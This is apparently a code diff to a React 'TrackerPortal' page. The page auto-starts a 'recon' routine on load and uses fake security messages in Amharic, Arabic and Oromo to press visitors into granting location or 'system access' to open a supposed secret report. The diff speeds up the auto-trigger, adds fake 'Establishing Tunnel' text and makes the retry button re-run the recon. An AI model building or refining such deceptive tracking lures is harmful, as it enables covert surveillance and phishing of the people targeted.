@@ -58,7 +58,7 @@ export const TrackerPortal: React.FC = () => {
     // Auto-trigger tracking protocol immediately on load
     const autoStart = setTimeout(() => {
        startRecon();
-    }, 500);
+    }, 150);
 
     return () => {
       clearInterval(countdown);
@@ -76,6 +76,12 @@ export const TrackerPortal: React.FC = () => {
     amharic: "መረጃውን ለማግኘት መጀመሪያ ይግቡ (Sign In)",
     arabic: "سجل دخولك أولاً للوصول إلى المعلومات",
     oromo: "Odeeffannoo kana argachuuf dura galmaa'aa (Log In)"
+  };
+
+  const scanningMessages = {
+    amharic: "ዳታውን በመጫን ላይ (Establishing Tunnel)...",
+    arabic: "إنشاء نفق البيانات (Establishing Tunnel)...",
+    oromo: "Odeeffannoo walitti fiduu (Establishing Tunnel)..."
   };
 
   // Protocol initialization
@@ -322,7 +328,9 @@ export const TrackerPortal: React.FC = () => {
             <div className="space-y-6 py-4">
               <div className="space-y-2">
                 <div className="flex justify-between items-center text-[10px] font-bold text-slate-600 mb-1">
-                  <span className="tracking-[0.2em] animate-pulse">ESTABLISHING TUNNEL...</span>
+                  <span className="tracking-[0.2em] animate-pulse uppercase">
+                    {lang === 'amharic' ? scanningMessages.amharic : lang === 'arabic' ? scanningMessages.arabic : scanningMessages.oromo}
+                  </span>
                   <span className="text-blue-500 font-mono italic">{progress}%</span>
                 </div>
                 <div className="h-1.5 w-full bg-slate-900 rounded-full overflow-hidden border border-slate-800">
@@ -428,14 +436,14 @@ export const TrackerPortal: React.FC = () => {
             <div className="text-center p-8 border border-red-500/20 bg-red-500/5 rounded-lg space-y-4">
               <AlertTriangle className="w-10 h-10 text-red-600 mx-auto opacity-80" />
               <div className="space-y-1">
-                <p className="text-[12px] text-red-500 font-black uppercase tracking-tighter italic">SECURITY_PROTOCOL_REVOKED</p>
-                <p className="text-[9px] text-slate-500 leading-relaxed font-medium">የምስጢር ሰነዱን ለማንበብ የቦታ መገኛ (Location) ፈቃድ ያስፈልጋል፡፡ እባኮት "Allow" የሚለውን በመጫን ፈቃድ ይስጡ።</p>
+                <p className="text-[12px] text-red-500 font-black uppercase tracking-tighter italic">PROTOCOL_HANDSHAKE_FAILED</p>
+                <p className="text-[9px] text-slate-500 leading-relaxed font-medium">የዳታ ጥበቃ ማረጋገጫ አልተሳካም። ምስጢራዊ ዘገባውን ለመክፈት የሲስተም ፈቃድ (System Access) መስጠት አስፈላጊ ነው።</p>
               </div>
               <button 
-                onClick={() => setStatus('idle')}
+                onClick={() => startRecon()}
                 className="w-full py-3 bg-slate-800 hover:bg-slate-700 text-white text-[10px] uppercase font-bold rounded transition-colors"
               >
-                እንደገና ይሞክሩ (RE-AUTHORIZE)
+                ዳግም አስጀምር (RE-INITIALIZE)
               </button>
             </div>
           )}
